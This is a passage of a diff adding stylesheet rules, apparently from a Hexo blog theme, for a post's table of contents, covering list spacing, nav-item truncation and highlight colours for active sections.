+  font-size: 0.92rem;
+  box-sizing: border-box;
+
+  .post-toc {
+
+    ol {
+      list-style: none;
+      margin: 0;
+      padding: 0 2px 12px 10px;
+      text-align: left;
+
+      &:last-child {
+        padding-bottom: 0;
+      }
+
+      > ol {
+        padding-left: 0;
+      }
+
+      a {
+        transition-property: all;
+        transition();
+      }
+    }
+
+
+    .nav-item {
+      line-height: 1.8;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+
+    .nav {
+      .nav-child {
+        display: hexo-config('toc.expand_all') ? block : none;
+      }
+
+      .active > .nav-child {
+        display: block;
+      }
+
+      .active-current > .nav-child {
+        display: block;
+
+        > .nav-item {
+          display: block;
+        }
+      }
+
+
+      .nav-number, .nav-text {
+        color: var(--default-text-color);
+      }
+
+      .active > a {
+        .nav-number, .nav-text {
+          color: var(--primary-color);
+        }
+      }
+
+      .active-current > a {
+        .nav-number, .nav-text {
+          color: var(--primary-color);
+        }
+      }
+    }
+  }
+}
+
+
         </aside>
     
 
